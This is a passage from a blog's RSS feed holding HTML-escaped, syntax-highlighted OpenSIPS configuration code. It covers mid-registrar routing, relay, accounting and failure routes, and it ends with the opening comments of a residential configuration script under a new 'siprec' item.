&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			$ru &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;sip:10.0.0.3:5070&amp;#34;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			t_relay&lt;span style=&#34;color:#f92672&#34;&gt;()&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			break;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#66d9ef&#34;&gt;case&lt;/span&gt; 2:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			xlog&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;absorbing REGISTER! (&lt;/span&gt;$$&lt;span style=&#34;color:#e6db74&#34;&gt;ci=&lt;/span&gt;$ci&lt;span style=&#34;color:#e6db74&#34;&gt;)\n&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			break;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		default:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			xlog&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;failed to save registration! (&lt;/span&gt;$$&lt;span style=&#34;color:#e6db74&#34;&gt;ci=&lt;/span&gt;$ci&lt;span style=&#34;color:#e6db74&#34;&gt;)\n&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		exit;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;# preloaded route checking&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;loose_route&lt;span style=&#34;color:#f92672&#34;&gt;())&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		xlog&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;L_ERR&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Attempt to route with preloaded Route&amp;#39;s [&lt;/span&gt;$fu&lt;span style=&#34;color:#e6db74&#34;&gt;/&lt;/span&gt;$tu&lt;span style=&#34;color:#e6db74&#34;&gt;/&lt;/span&gt;$ru&lt;span style=&#34;color:#e6db74&#34;&gt;/&lt;/span&gt;$ci&lt;span style=&#34;color:#e6db74&#34;&gt;]&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;!is_method&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;ACK&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			sl_send_reply&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;403&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Preload Route denied&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		exit;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;# record routing&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;!is_method&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;REGISTER|MESSAGE&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		record_route&lt;span style=&#34;color:#f92672&#34;&gt;()&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;# account only INVITEs&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;is_method&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;INVITE&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		do_accounting&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;log&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;!uri&lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt;myself&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		append_hf&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;P-hint: outbound\r\n&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;; 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		route&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;relay&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;# requests for my domain&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;is_method&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;PUBLISH|SUBSCRIBE&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		sl_send_reply&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;503&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Service Unavailable&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		exit;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;$rU&lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt;NULL&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#75715e&#34;&gt;# request with no Username in RURI&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		sl_send_reply&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;484&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Address Incomplete&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		exit;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;# initial requests from main registrar, need to look them up!&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;is_method&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;INVITE|MESSAGE&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; $si &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;10.0.0.3&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; $sp &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; 5070&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		xlog&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;looking up &lt;/span&gt;$ru&lt;span style=&#34;color:#e6db74&#34;&gt;!\n&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;!mid_registrar_lookup&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;location&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			t_reply&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;404&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Not Found&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			exit;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		t_relay&lt;span style=&#34;color:#f92672&#34;&gt;()&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		exit;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;# when routing via usrloc, log the missed calls also&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	do_accounting&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;log&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;missed&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	route&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;relay&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;route&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;relay&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;# for INVITEs enable some additional helper routes&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;is_method&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;INVITE&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		t_on_branch&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;per_branch_ops&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		t_on_reply&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;handle_nat&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		t_on_failure&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;missed_call&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;!t_relay&lt;span style=&#34;color:#f92672&#34;&gt;())&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		send_reply&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;500&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Internal Error&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	exit;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;branch_route&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;per_branch_ops&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	xlog&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;new branch at &lt;/span&gt;$ru&lt;span style=&#34;color:#e6db74&#34;&gt;\n&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;onreply_route&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;handle_nat&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	xlog&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;incoming reply\n&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;failure_route&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;missed_call&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;t_was_cancelled&lt;span style=&#34;color:#f92672&#34;&gt;())&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		exit;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;# uncomment the following lines if you want to block client &lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;# redirect based on 3xx replies.&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;##if (t_check_status(&amp;#34;3[0-9][0-9]&amp;#34;)) {&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;##t_reply(&amp;#34;404&amp;#34;,&amp;#34;Not found&amp;#34;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;##	exit;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;##}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
    </item>
    <item>
      <title>siprec</title>
      <link>https://wdd.js.org/opensips/ch8/siprec/</link>
      <pubDate>Tue, 02 Jul 2019 22:31:18 +0800</pubDate>
      <guid>https://wdd.js.org/opensips/ch8/siprec/</guid>
      <description>&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# OpenSIPS residential configuration script&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#     by OpenSIPS Solutions &amp;lt;team@opensips-solutions.com&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# This script was generated via &amp;#34;make menuconfig&amp;#34;, from&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#   the &amp;#34;Residential&amp;#34; scenario.&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# You can enable / disable more features / functionalities by&lt;/span&gt;
